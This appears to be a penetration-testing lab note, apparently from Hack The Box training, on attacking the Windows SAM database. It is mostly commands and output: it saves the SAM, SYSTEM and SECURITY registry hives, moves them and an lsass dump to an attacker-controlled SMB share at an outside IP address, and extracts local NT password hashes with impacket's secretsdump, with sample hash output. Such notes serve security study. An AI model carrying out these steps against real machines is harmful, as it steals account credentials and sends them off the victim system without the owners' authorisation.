## Attacking SAM

### Registry Hives

|**Registry Hive**|**Description**|
|---|---|
|`hklm\sam`|Contains hashes for local account passwords. Needed for cracking passwords.|
|`hklm\system`|Contains the system bootkey, which encrypts the SAM database. Needed to decrypt SAM.|
|`hklm\security`|Contains cached credentials for domain accounts. Useful on domain-joined systems.|

> [!IMPORTANT]  
> SAM, Security, and System files cannot be accessed directly as they are used by other processes. A duplicate file must be created and transferred for offline cracking.

### Saving Registry Hives on the Victim Machine

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg save hklm\security C:\security.save
The operation completed successfully.
```

### Transferring Files to the Attacker Machine

1. **On the Attacker Machine:**

```shell
pradyun2005@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <destination in attacker>
```

2. **On the Victim Machine:**

```cmd
C:\> move lsass.DMP \\110.10.14.159\lsass
C:\> move security.save \\110.10.14.159\regfile
C:\> move system.save \\110.10.14.159\regfile
```

### Extracting SAM Hashes Using Impacket

```shell
pradyun2005@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Example Output:**

```
[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
[*] Cleaning up...
```

---